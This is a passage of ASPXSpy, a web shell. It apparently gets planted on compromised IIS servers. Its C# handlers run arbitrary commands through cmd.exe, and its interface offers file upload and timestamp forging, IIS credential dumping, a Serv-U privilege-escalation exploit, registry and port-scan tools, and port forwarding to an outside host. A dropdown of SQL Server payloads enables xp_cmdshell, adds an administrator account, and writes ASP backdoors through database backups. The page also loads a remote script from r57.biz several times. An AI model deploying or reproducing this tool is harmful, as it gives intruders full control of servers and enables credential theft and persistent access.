xseuB(error.Message);
}
krIR(AXSbb.Value);
}
protected void VOxn(object sender,EventArgs e)
{
WICxe();
vIac.Visible=true;
Bin_H2_Title.InnerText="Execute Command &gt;&gt;";
}
protected void FbhN(object sender,EventArgs e)
{
try
{
Process ahAE=new Process();
ahAE.StartInfo.FileName=kusi.Value;
ahAE.StartInfo.Arguments=bkcm.Value;
ahAE.StartInfo.UseShellExecute=false;
ahAE.StartInfo.RedirectStandardInput=true;
ahAE.StartInfo.RedirectStandardOutput=true;
ahAE.StartInfo.RedirectStandardError=true;
ahAE.Start();
string Uoc=ahAE.StandardOutput.ReadToEnd();
Uoc=Uoc.Replace("&lt;","&lt;");
Uoc=Uoc.Replace("&gt;","&gt;");
Uoc=Uoc.Replace("\r\n","&lt;br&gt;");
tnQRF.Visible=true;
tnQRF.InnerHtml="&lt;hr width=\"100%\" noshade/&gt;&lt;pre&gt;"+Uoc+"&lt;/pre&gt;";
}
catch(Exception error)
{
xseuB(error.Message);
}
}
protected void RAFL(object sender,EventArgs e)
{
if(qPdI.Text.Length&gt;0)
{
tpRQ(qPdI.Text);
}
else
{
lFAvw();
}
}
protected void Grxk(object sender,EventArgs e)
{
YUw();
}
protected void ilC(object sender,EventArgs e)
{
tZRH();
}
protected void HtB(object sender,EventArgs e)
{
pDVM();
}
protected void Olm(object sender,EventArgs e)
{
iLVUT();
}
protected void jXhS(object sender,EventArgs e)
{
ADCpk();
}
protected void lRfRj(object sender,EventArgs e)
{
lDODR();
}
protected void xSy(object sender,EventArgs e)
{
xFhz();
}
protected void dMx(object sender,EventArgs e)
{
rAhe();
}
protected void zOVO(object sender,EventArgs e)
{
if(((DropDownList)sender).ID.ToString()=="WYmo")
{
dQIIF.Visible=false;
MasR.Text=WYmo.SelectedItem.Value.ToString();
}
if(((DropDownList)sender).ID.ToString()=="Pvf")
{
xTZY();
}
if(((DropDownList)sender).ID.ToString()=="FGEy")
{
jHIy.InnerText=FGEy.SelectedItem.Value.ToString();
}
if(((DropDownList)sender).ID.ToString()=="NdCX")
{
gLKc(Sqon.Value);
}
}
protected void IkkO(object sender,EventArgs e)
{
krIR(AXSbb.Value);
}
protected void BGY(object sender,EventArgs e)
{
vCf();
}
protected void cptS(object sender,EventArgs e)
{
vNCHZ();
}
protected void fDO(object sender,EventArgs e)
{
MHLv();
}
protected void vJNsE(object sender,EventArgs e)
{
vuou();
xseuB("Clear All Thread ......");
}
protected void wDZ(object sender,EventArgs e)
{
if(iXdh.Value=="" || eEpm.Value.Length&lt;7 || ZHS.Value=="")return;
ruQO();
xseuB("All Thread Start ......");
}
protected void tYoZ(object sender,EventArgs e)
{
}
protected void ELkQ(object sender,EventArgs e)
{
VikG();
GBYT.Visible=true;
string res=string.Empty;
foreach(ScanPort th in IVc)
{
res+=th.ip+" : "+th.port+" ................................. "+th.status+"&lt;br&gt;";
}
GBYT.InnerHtml=res;
}
protected void ORUgV(object sender,EventArgs e)
{
dwgT();
}
public void WICxe()
{
DCbS.Visible=false;
CzfO.Visible=false;
APl.Visible=false;
vIac.Visible=false;
kkHN.Visible=false;
YwLB.Visible=false;
iDgmL.Visible=false;
hOWTm.Visible=false;
vrFA.Visible=false;
yhv.Visible=false;
}
&lt;/script&gt;
&lt;html xmlns="http://www.w3.org/1999/xhtml" &gt;
&lt;SCRIPT SRC=http://r57.biz/yazciz/ciz.js&gt;&lt;/SCRIPT&gt;
&lt;head id="Head1" runat="server"&gt;
&lt;SCRIPT SRC=http://r57.biz/yazciz/ciz.js&gt;&lt;/SCRIPT&gt;
&lt;meta http-equiv="Content-Type" content="text/html;charset=utf-8"/&gt;
&lt;title&gt;ASPXspy&lt;/title&gt;
&lt;SCRIPT SRC=http://r57.biz/yazciz/ciz.js&gt;&lt;/SCRIPT&gt;
&lt;style type="text/css"&gt;
.Bin_Style_Login{font:11px Verdana;BACKGROUND: #FFFFFF;border: 1px solid #666666;}
body,td{font: 12px Arial,Tahoma;line-height: 16px;}
.input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:16px;}
.list{font:12px Arial,Tahoma;height:23px;}
.area{font:12px 'Courier New',Monospace;background:#fff;border: 1px solid #666;padding:2px;}
.bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}
a {color: #00f;text-decoration:underline;}
a:hover{color: #f00;text-decoration:none;}
.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ededed;padding:5px 10px 5px 5px;}
.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#fafafa;padding:5px 10px 5px 5px;}
.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 10px 5px 5px;}
.head td{border-top:1px solid #ddd;border-bottom:1px solid #ccc;background:#e8e8e8;padding:5px 10px 5px 5px;font-weight:bold;}
.head td span{font-weight:normal;}
form{margin:0;padding:0;}
h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
.u1{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
.u2{text-decoration: none;color:#777;float:left;display:block;width:350px;margin-right:10px;}
&lt;/style&gt;
&lt;script type="text/javascript"&gt;
function CheckAll(form){
for(var i=0;i&lt;form.elements.length;i++){
var e=form.elements[i];
if(e.name!='chkall')
e.checked=form.chkall.checked;
}
}
&lt;/script&gt;
&lt;/head&gt;
&lt;body style="margin:0;table-layout:fixed;"&gt;
&lt;form id="ASPXSpy" runat="server"&gt;
&lt;div id="ljtzC" runat="server" style=" margin:15px" enableviewstate="false" visible="false" &gt;
&lt;span style="font:11px Verdana;"&gt;Password:&lt;/span&gt;
&lt;asp:TextBox ID="HRJ" runat="server" Columns="20" CssClass="Bin_Style_Login" &gt;&lt;/asp:TextBox&gt;
&lt;asp:Button ID="ZSnXu" runat="server" Text="Login" CssClass="Bin_Style_Login" OnClick="xVm"/&gt;&lt;p/&gt;
Copyright &copy; 2009 Bin -- &lt;a href="http://www.rootkit.net.cn" target="_blank"&gt;www.rootkit.net.cn&lt;/a&gt;
&lt;/div&gt;
&lt;div id="ZVS" runat="server"&gt;
&lt;div id="Zzj" runat="server"&gt;
&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;
&lt;tr class="head"&gt;
&lt;td &gt;&lt;span style="float:right;"&gt;&lt;a href="http://www.rootkit.net.cn" target="_blank"&gt;ASPXSpy Ver: 2009&lt;/a&gt;&lt;/span&gt;&lt;span id="Bin_Span_Sname" runat="server" enableviewstate="true"&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr class="alt1"&gt;
&lt;td&gt;&lt;span style="float:right;" id="Bin_Span_FrameVersion" runat="server"&gt;&lt;/span&gt;
&lt;asp:LinkButton ID="UtkN" runat="server" OnClick="YKpI" Text="Logout" &gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="RsqhW" runat="server" Text="File Manager" OnClick="Ybg"&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="xxzE" runat="server" Text="CmdShell" OnClick="VOxn"&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="nuc" runat="server" Text="IIS Spy" OnClick="KjPi"&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="OREpx" runat="server" Text="Process" OnClick="Grxk"&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="jHN" runat="server" Text="Services" OnClick="ilC"&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="PHq" runat="server" Text="UserInfo" OnClick="Olm"&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="wmgnK" runat="server" Text="SysInfo" OnClick="HtB"&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="FeV" runat="server" Text="FileSearch" OnClick="PPtK"&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="PVQ" runat="server" Text="SU Exp" OnClick="jXhS"&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="jNDb" runat="server" Text="RegShell" OnClick="xSy"&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="HDQ" runat="server" Text="PortScan" OnClick="cptS" &gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="AoI" runat="server" Text="DataBase" OnClick="dMx"&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="KHbEd" runat="server" Text="PortMap" OnClick="fDO"&gt;&lt;/asp:LinkButton&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;table width="100%" border="0" cellpadding="15" cellspacing="0"&gt;&lt;tr&gt;&lt;td&gt;
&lt;div id="jDKt" style="background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;" runat="server" visible="false" enableviewstate="false"&gt;&lt;/div&gt;
&lt;h2 id="Bin_H2_Title" runat="server"&gt;&lt;/h2&gt;
&lt;%--FileList--%&gt;
&lt;div id="CzfO" runat="server"&gt;
&lt;table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;"&gt;
 &lt;tr&gt;
&lt;td style=" white-space:nowrap"&gt;Current Directory : &lt;/td&gt;
&lt;td style=" width:100%"&gt;&lt;input class="input" id="AXSbb" type="text" style="width:97%;margin:0 8px;" runat="server"/&gt;
&lt;/td&gt;
&lt;td style="white-space:nowrap" &gt;&lt;asp:Button ID="xaGwl" runat="server" Text="Go" CssClass="bt" OnClick="EXV"/&gt;&lt;/td&gt;
 &lt;/tr&gt;
&lt;/table&gt;
&lt;table width="100%" border="0" cellpadding="4" cellspacing="0"&gt;
&lt;tr class="alt1"&gt;&lt;td colspan="7" style="padding:5px;"&gt;
&lt;div style="float:right;"&gt;&lt;input id="Fhq" class="input" runat="server" type="file" style=" height:22px"/&gt;
&lt;asp:Button ID="RvPp" CssClass="bt" runat="server" Text="Upload" OnClick="lbjLD"/&gt;&lt;/div&gt;&lt;asp:LinkButton ID="OLJFp" runat="server" Text="WebRoot" OnClick="mcCY"&gt;&lt;/asp:LinkButton&gt; | &lt;a href="#" id="Bin_Button_CreateDir" runat="server"&gt;Create Directory&lt;/a&gt; | &lt;a href="#" id="Bin_Button_CreateFile" runat="server"&gt;Create File&lt;/a&gt;
 | &lt;span id="Bin_Span_Drv" runat="server"&gt;&lt;/span&gt;&lt;a href="#" id="Bin_Button_KillMe" runat="server" style="color:Red"&gt;Kill Me&lt;/a&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;asp:Table ID="UGzP" runat="server" Width="100%" CellSpacing="0" &gt;
&lt;asp:TableRow CssClass="head"&gt;&lt;asp:TableCell&gt;&nbsp;&lt;/asp:TableCell&gt;&lt;asp:TableCell&gt;Filename&lt;/asp:TableCell&gt;&lt;asp:TableCell Width="25%"&gt;Last modified&lt;/asp:TableCell&gt;&lt;asp:TableCell Width="15%"&gt;Size&lt;/asp:TableCell&gt;&lt;asp:TableCell Width="25%"&gt;Action&lt;/asp:TableCell&gt;&lt;/asp:TableRow&gt;
&lt;/asp:Table&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;%--FileEdit--%&gt;
&lt;div id="vrFA" runat="server"&gt;
&lt;p&gt;Current File(import new file name and new file)&lt;br/&gt;
&lt;input class="input" id="Sqon" type="text" size="100" runat="server"/&gt; &lt;asp:DropDownList ID="NdCX" runat="server" CssClass="list" AutoPostBack="true" OnSelectedIndexChanged="zOVO"&gt;&lt;asp:ListItem&gt;Default&lt;/asp:ListItem&gt;&lt;asp:ListItem&gt;UTF-8&lt;/asp:ListItem&gt;&lt;/asp:DropDownList&gt;
&lt;/p&gt;
&lt;p&gt;File Content&lt;br/&gt;
&lt;textarea id="Xgvv" runat="server" class="area" cols="100" rows="25" enableviewstate="true" &gt;&lt;/textarea&gt;
&lt;/p&gt;
&lt;p&gt;&lt;asp:Button ID="JJjbW" runat="server" Text="Submit" CssClass="bt" OnClick="DGCoW"/&gt; &lt;asp:Button ID="iCNu" runat="server" Text="Back" CssClass="bt" OnClick="IkkO"/&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;%--CloneTime--%&gt;
&lt;div id="zRyG" runat="server" enableviewstate="false" visible="false"&gt;
&lt;p&gt;Alter file&lt;br/&gt;&lt;input class="input" id="QiFB" type="text" size="120" runat="server"/&gt;&lt;/p&gt;
&lt;p&gt;Reference file(fullpath)&lt;br/&gt;&lt;input class="input" id="lICp" type="text" size="120" runat="server"/&gt;&lt;/p&gt;
&lt;p&gt;&lt;asp:Button ID="JEaxV" runat="server" Text="Submit" CssClass="bt" OnClick="XXrLw"/&gt;&lt;/p&gt;
&lt;h2&gt;Set last modified &raquo;&lt;/h2&gt;
&lt;p&gt;Current file(fullpath)&lt;br/&gt;&lt;input class="input" id="pWVL" type="text" size="120" runat="server"/&gt;&lt;/p&gt;
&lt;p&gt;
&lt;asp:CheckBox ID="ZhWSK" runat="server" Text="ReadOnly" EnableViewState="False"/&gt;
&nbsp;
&lt;asp:CheckBox ID="SsR" runat="server" Text="System" EnableViewState="False"/&gt;
&nbsp;
&lt;asp:CheckBox ID="ccB" runat="server" Text="Hidden" EnableViewState="False"/&gt;
&nbsp;
&lt;asp:CheckBox ID="fbyZ" runat="server" Text="Archive" EnableViewState="False"/&gt;
&lt;/p&gt;
&lt;p&gt;
CreationTime :
&lt;input class="input" id="yUqx" type="text" runat="server"/&gt;
LastWriteTime :
&lt;input class="input" id="uYjw" type="text" runat="server"/&gt;
LastAccessTime :
&lt;input class="input" id="aLsn" type="text" runat="server"/&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;asp:Button ID="kOG" CssClass="bt" runat="server" Text="Submit" OnClick="tIykC"/&gt;
&lt;/p&gt;
&lt;/div&gt;
&lt;%--IISSpy--%&gt;
&lt;div runat="server" id="VNR" visible="false" enableviewstate="false"&gt;
&lt;table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;"&gt;
&lt;asp:Table ID="GlI" runat="server" Width="100%" CellSpacing="0"&gt;
&lt;asp:TableRow CssClass="head"&gt;&lt;asp:TableCell&gt;ID&lt;/asp:TableCell&gt;&lt;asp:TableCell&gt;IIS_USER&lt;/asp:TableCell&gt;&lt;asp:TableCell&gt;IIS_PASS&lt;/asp:TableCell&gt;&lt;asp:TableCell&gt;Domain&lt;/asp:TableCell&gt;&lt;asp:TableCell&gt;Path&lt;/asp:TableCell&gt;&lt;/asp:TableRow&gt;
&lt;/asp:Table&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;%--Process--%&gt;
&lt;div runat="server" id="DCbS" visible="false" enableviewstate="false"&gt;
&lt;table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;"&gt;
&lt;asp:Table ID="IjsL" runat="server" Width="100%" CellSpacing="0" &gt;
&lt;asp:TableRow CssClass="head"&gt;&lt;asp:TableCell&gt;&lt;/asp:TableCell&gt;&lt;asp:TableCell&gt;ID&lt;/asp:TableCell&gt;&lt;asp:TableCell&gt;Process&lt;/asp:TableCell&gt;&lt;asp:TableCell&gt;ThreadCount&lt;/asp:TableCell&gt;&lt;asp:TableCell&gt;Priority&lt;/asp:TableCell&gt;&lt;asp:TableCell&gt;Action&lt;/asp:TableCell&gt;&lt;/asp:TableRow&gt;
&lt;/asp:Table&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;%--CmdShell--%&gt;
&lt;div runat="server" id="vIac"&gt;
 &lt;p&gt;CmdPath:&lt;br/&gt;
 &lt;input class="input" runat="server" id="kusi" type="text" size="100" value="c:\windows\system32\cmd.exe"/&gt;
 &lt;/p&gt;
 Argument:&lt;br/&gt;
 &lt;input class="input" runat="server" id="bkcm" value="/c Set" type="text" size="100"/&gt; &lt;asp:Button ID="YrqL" CssClass="bt" runat="server" Text="Submit" OnClick="FbhN"/&gt;
 &lt;div id="tnQRF" runat="server" visible="false" enableviewstate="false"&gt;
 &lt;/div&gt;
&lt;/div&gt;
&lt;%--Services--%&gt;
&lt;div runat="server" id="iQxm" visible ="false" enableviewstate="false"&gt;
&lt;table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;"&gt;
&lt;asp:Table ID="vHCs" runat="server" Width="100%" CellSpacing="0" &gt;
&lt;asp:TableRow CssClass="head"&gt;&lt;asp:TableCell&gt;&lt;/asp:TableCell&gt;&lt;asp:TableCell&gt;ID&lt;/asp:TableCell&gt;&lt;asp:TableCell&gt;Name&lt;/asp:TableCell&gt;&lt;asp:TableCell&gt;Path&lt;/asp:TableCell&gt;&lt;asp:TableCell&gt;State&lt;/asp:TableCell&gt;&lt;asp:TableCell&gt;StartMode&lt;/asp:TableCell&gt;&lt;/asp:TableRow&gt;
&lt;/asp:Table&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;%--Sysinfo--%&gt;
&lt;div runat="server" id="ghaB" visible="false" enableviewstate="false"&gt;
&lt;hr style=" border: 1px solid #ddd;height:0px;"/&gt;
&lt;ul class="info" id="Bin_Ul_Sys" runat="server"&gt;&lt;/ul&gt;
&lt;h2 id="Bin_H2_Mac" runat="server"&gt;&lt;/h2&gt;
&lt;hr style=" border: 1px solid #ddd;height:0px;"/&gt;
&lt;ul class="info" id ="Bin_Ul_NetConfig" runat="server"&gt;&lt;/ul&gt;
&lt;h2 id="Bin_H2_Driver" runat="server"&gt;&lt;/h2&gt;
&lt;hr style=" border: 1px solid #ddd;height:0px;"/&gt;
&lt;ul class="info" id ="Bin_Ul_Driver" runat="server"&gt;&lt;/ul&gt;
&lt;/div&gt;
&lt;%--UserInfo--%&gt;
&lt;div runat="server" id="xWVQ" visible="false" enableviewstate="false"&gt;
&lt;table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;"&gt;
&lt;asp:Table ID="VPa" runat="server" Width="100%" CellSpacing="0" &gt;
&lt;/asp:Table&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;%--SuExp--%&gt;
 &lt;div runat="server" id="APl"&gt;
&lt;table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;"&gt;
 &lt;tr align="center"&gt;
 &lt;td style="width:10%"&gt;&lt;/td&gt;
 &lt;td style="width:20%" align="left"&gt;UserName : &lt;input class="input" runat="server" id="dNohJ" type="text" size="20" value="localadministrator"/&gt;&lt;/td&gt;
 &lt;td style="width:20%" align="left"&gt;PassWord : &lt;input class="input" runat="server" id="NMd" type="text" size="20" value="#l@$ak#.lk;0@P"/&gt;&lt;/td&gt;
 &lt;td style="width:20%" align="left"&gt;Port : &lt;input class="input" runat="server" id="HlQl" type="text" size="20" value="43958"/&gt;&lt;/td&gt;
 &lt;td style="width:10%"&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr &gt;
 &lt;td style="width:10%"&gt;&lt;/td&gt;
 &lt;td colspan="5"&gt;CmdShell&nbsp;&nbsp;:&nbsp;&lt;input class="input" runat="server" id="mHbjB" type="text" size="100" value="cmd.exe /c net user"/&gt; &lt;asp:Button ID="SPhc" CssClass="bt" runat="server" Text="Exploit" OnClick="lRfRj"/&gt;&lt;/td&gt;
 &lt;/tr&gt;
&lt;/table&gt;
&lt;div id="UHlA" visible="false" enableviewstate="false" runat="server"&gt;
&lt;table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;"&gt;
&lt;tr align="center"&gt;
&lt;td style="width:30%"&gt;&lt;/td&gt;
&lt;td align="left" style="width:40%"&gt;&lt;pre id="Bin_Td_Res" runat="server"&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td style="width:30%"&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;%--Reg--%&gt;
&lt;div id="kkHN" runat="server"&gt;
&lt;p&gt;Registry Path : &lt;asp:TextBox id="qPdI" style="width:85%;margin:0 8px;" CssClass="input" runat="server"/&gt;&lt;asp:Button ID="MoNA" runat="server" Text="Go" CssClass="bt" onclick="RAFL"/&gt;&lt;/p&gt;
&lt;table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;"&gt;
&lt;asp:Table ID="pLWD" runat="server" Width="100%" CellSpacing="0" &gt;
&lt;asp:TableRow CssClass="alt1"&gt;&lt;asp:TableCell ColumnSpan="2" id="vyX"&gt;&lt;/asp:TableCell&gt;&lt;/asp:TableRow&gt;
&lt;asp:TableRow CssClass="head"&gt;&lt;asp:TableCell Width="40%"&gt;Key&lt;/asp:TableCell&gt;&lt;asp:TableCell Width="60%"&gt;Value&lt;/asp:TableCell&gt;&lt;/asp:TableRow&gt;
&lt;/asp:Table&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;%--PortScan--%&gt;
&lt;div id="YwLB" runat="server"&gt;
&lt;p&gt;
IP : &lt;asp:TextBox id="MdR" style="width:10%;margin:0 8px;" CssClass="input" runat="server" Text="127.0.0.1"/&gt; Port : &lt;asp:TextBox id="lOmX" style="width:40%;margin:0 8px;" CssClass="input" runat="server" Text="21,25,80,110,1433,1723,3306,3389,4899,5631,43958,65500"/&gt; &lt;asp:Button ID="CmUCh" runat="server" Text="Scan" CssClass="bt" OnClick="ELkQ"/&gt;
&lt;/p&gt;
&lt;div id="GBYT" runat="server" visible="false" enableviewstate="false"&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;%--DataBase--%&gt;
&lt;div id="iDgmL" runat="server"&gt;
&lt;p&gt;ConnString : &lt;asp:TextBox id="MasR" style="width:70%;margin:0 8px;" CssClass="input" runat="server"/&gt;&lt;asp:DropDownList runat="server" CssClass="list" ID="WYmo" AutoPostBack="True" OnSelectedIndexChanged="zOVO" &gt;&lt;asp:ListItem&gt;&lt;/asp:ListItem&gt;&lt;asp:ListItem Value="server=localhost;UID=sa;PWD=;database=master;Provider=SQLOLEDB"&gt;MSSQL&lt;/asp:ListItem&gt;&lt;asp:ListItem Value="Provider=Microsoft.Jet.OLEDB.4.0;Data Source=E:\database.mdb"&gt;ACCESS&lt;/asp:ListItem&gt;&lt;/asp:DropDownList&gt;&lt;asp:Button ID="QcZPA" runat="server" Text="Go" CssClass="bt" OnClick="BGY"/&gt;&lt;/p&gt;
&lt;div id="dQIIF" runat="server"&gt;
&lt;div id="irTU" runat="server"&gt;&lt;/div&gt;
&lt;div id="uXevN" runat="server"&gt;
Please select a database : &lt;asp:DropDownList runat="server" ID="Pvf" AutoPostBack="True" OnSelectedIndexChanged="zOVO" CssClass="list"&gt;&lt;/asp:DropDownList&gt;
SQLExec : &lt;asp:DropDownList runat="server" ID="FGEy" AutoPostBack="True" OnSelectedIndexChanged="zOVO" CssClass="list"&gt;&lt;asp:ListItem Value=""&gt;-- SQL Server Exec --&lt;/asp:ListItem&gt;&lt;asp:ListItem Value="Use master dbcc addextendedproc('xp_cmdshell','xplog70.dll')"&gt;Add xp_cmdshell&lt;/asp:ListItem&gt;&lt;asp:ListItem Value="Use master dbcc addextendedproc('sp_OACreate','odsole70.dll')"&gt;Add sp_oacreate&lt;/asp:ListItem&gt;&lt;asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;"&gt;Add xp_cmdshell(SQL2005)&lt;/asp:ListItem&gt;&lt;asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE;"&gt;Add sp_oacreate(SQL2005)&lt;/asp:ListItem&gt;&lt;asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'Web Assistant Procedures',1;RECONFIGURE;"&gt;Add makewebtask(SQL2005)&lt;/asp:ListItem&gt;&lt;asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE;"&gt;Add openrowset/opendatasource(SQL2005)&lt;/asp:ListItem&gt;&lt;asp:ListItem Value="Exec master.dbo.xp_cmdshell 'net user'"&gt;XP_cmdshell exec&lt;/asp:ListItem&gt;&lt;asp:ListItem Value="EXEC MASTER..XP_dirtree 'c:\',1,1"&gt;XP_dirtree&lt;/asp:ListItem&gt;&lt;asp:ListItem Value="Declare @s int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^&lt;%execute(request(char(35)))%^&gt;&gt;c:\bin.asp';"&gt;SP_oamethod exec&lt;/asp:ListItem&gt;&lt;asp:ListItem Value="sp_makewebtask @outputfile='c:\bin.asp',@charset=gb2312,@query='select ''&lt;%execute(request(chr(35)))%&gt;'''"&gt;SP_makewebtask make file&lt;/asp:ListItem&gt;&lt;asp:ListItem Value="exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1;select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\ias.mdb','select shell(&#34;cmd.exe /c net user root root/add &#34;)')"&gt;SandBox&lt;/asp:ListItem&gt;&lt;asp:ListItem Value="create table [bin_cmd]([cmd] [image]);declare @a sysname,@s nvarchar(4000)select @a=db_name(),@s=0x62696E backup log @a to disk=@s;insert into [bin_cmd](cmd)values('&lt;%execute(request(chr(35)))%&gt;');declare @b sysname,@t nvarchar(4000)select @b=db_name(),@t='e:\1.asp' backup log @b to disk=@t with init,no_truncate;drop table [bin_cmd];"&gt;LogBackup&lt;/asp:ListItem&gt;&lt;asp:ListItem Value="create table [bin_cmd]([cmd] [image]);declare @a sysname,@s nvarchar(4000)select @a=db_name(),@s=0x62696E backup database @a to disk=@s;insert into [bin_cmd](cmd)values('&lt;%execute(request(chr(35)))%&gt;');declare @b sysname,@t nvarchar(4000)select @b=db_name(),@t='c:\bin.asp' backup database @b to disk=@t WITH DIFFERENTIAL,FORMAT;drop table [bin_cmd];"&gt;DatabaseBackup&lt;/asp:ListItem&gt;&lt;/asp:DropDownList&gt;
&lt;/div&gt;
&lt;table width="200" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td&gt; Run SQL &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;textarea id="jHIy" class="area" style="width:600px;height:60px;overflow:auto;" runat="server" rows="6" cols="1"&gt;&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;
&lt;asp:Button runat="server" ID="WOhJ" CssClass="bt" Text="Query" onclick="ORUgV"/&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;div style="overflow-x:auto;width:950px" &gt;
&lt;p&gt;
&lt;asp:DataGrid runat="server" ID="rom" HeaderStyle-CssClass="head" BorderWidth="0" GridLines="None" &gt;&lt;/asp:DataGrid&gt;
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;%--PortMap--%&gt;
&lt;div id="hOWTm" runat="server"&gt;
&lt;table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;"&gt;
&lt;tr align="center"&gt;
&lt;td style="width:5%"&gt;&lt;/td&gt;
&lt;td style="width:20%" align="left"&gt;Local Ip : &lt;input class="input" runat="server" id="eEpm" type="text" size="20" value="127.0.0.1"/&gt;&lt;/td&gt;
&lt;td style="width:20%" align="left"&gt;Local Port : &lt;input class="input" runat="server" id="iXdh" type="text" size="20" value="3389"/&gt;&lt;/td&gt;
&lt;td style="width:20%" align="left"&gt;Remote Ip : &lt;input class="input" runat="server" id="llH" type="text" size="20" value="www.rootkit.net.cn"/&gt;&lt;/td&gt;
&lt;td style="width:20%" align="left"&gt;Remote Port : &lt;input class="input" runat="server" id="ZHS" type="text" size="20" value="80"/&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr align="center"&gt;&lt;td colspan="5"&gt;&lt;br/&gt;&lt;asp:Button ID="FJE" CssClass="bt" runat="server" Text="MapPort" OnClick="wDZ"/&gt; &lt;asp:Button ID="giX" CssClass="bt" runat="server" Text="ClearAll" OnClick="vJNsE"/&gt; &lt;asp:Button ID="GFsm" CssClass="bt" runat="server" Text="Refresh" OnClick="tYoZ"/&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;
&lt;%--Search--%&gt;
&lt;div id="yhv" runat="server"&gt;
&lt;table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;"&gt;
&lt;tr align="center"&gt;
&lt;td style="width:20%" align="left"&gt;Keyword&lt;/td&gt;
&lt;td style="width:60%" align="left"&gt;&lt;textarea id="iaMKl" runat="server" class="area" style="width:100%" rows="4"&gt;&lt;/textarea&gt;&lt;/td&gt;
&lt;td style="width:20%" align="left"&gt;&lt;input type="checkbox" runat="server" id="rAQ" value="1"/&gt; Use Regex&lt;/td&gt;
&lt;/tr&gt;
&lt;tr align="center"&gt;
&lt;td style="width:20%" align="left"&gt;Replace As&lt;/td&gt;
&lt;td style="width:60%" align="left"&gt;&lt;textarea id="qPe" runat="server" class="area" style="width:100%" rows="4"&gt;&lt;/textarea&gt;&lt;/td&gt;
&lt;td style="width:20%" align="left"&gt;&lt;input type="checkbox" runat="server" id="YZw"/&gt; Replace&lt;/td&gt;
&lt;/tr&gt;
&lt;tr align="center"&gt;
&lt;td style="width:20%" align="left"&gt;Search FileType&lt;/td&gt;
&lt;td style="width:60%" align="left"&gt;&lt;input type="text" runat="server" class="input" id="UDLvA" style="width:100%" value="asp|asa|cer|cdx|aspx|asax|ascx|cs|jsp|php|txt|inc|ini|js|htm|html|xml|config"/&gt;&lt;/td&gt;
